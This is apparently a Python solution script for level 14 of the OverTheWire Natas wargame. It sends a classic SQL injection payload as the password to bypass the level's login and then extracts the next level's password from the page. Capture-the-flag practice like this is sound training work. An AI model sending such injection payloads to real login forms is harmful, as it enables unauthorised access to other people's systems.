import requests

import natas13
from helpers import between


def solution() -> str:
    url = "http://natas14.natas.labs.overthewire.org"
    username = "natas14"
    password = natas13.solution()

    # The source code shows a straightforward SQL injection vulnerability.

    data = {"username": "natas14", "password": '" OR 1=1; -- '}
    r = requests.post(url, auth=(username, password), data=data)
    start = "The password for natas15 is "
    end = "<br><div"
    natas15_password = between(r.text, start, end)
    return natas15_password
